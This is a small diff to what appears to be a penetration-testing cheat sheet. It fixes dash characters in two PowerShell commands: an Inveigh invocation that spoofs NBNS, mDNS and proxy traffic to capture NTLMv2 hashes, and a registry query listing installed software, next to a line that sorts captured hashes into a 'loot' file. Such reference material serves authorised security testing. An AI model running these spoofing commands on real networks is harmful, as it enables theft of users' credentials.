@@ -2150,7 +2150,7 @@ $ sort -u -t: -k1,1 ~/ws/loot/net-ntlmv2.responder >> ~/ws/loot/net-ntlmv2.txt &
 * [https://github.com/Kevin-Robertson/Inveigh](https://github.com/Kevin-Robertson/Inveigh)
 
 ```
-PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y -NBNS Y –mDNS Y –Proxy Y -MachineAccounts Y
+PS > Invoke-Inveigh [-IP '10.10.13.37'] -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y
 ```
 
 ##### InveighZero
@@ -8621,7 +8621,7 @@ Cmd > mklink /D Link <DIRECTORY>
 ## Installed Software
 
 ```
-PS > Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize > InstalledSoftware.txt
+PS > Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -AutoSize > InstalledSoftware.txt
 ```
 
 
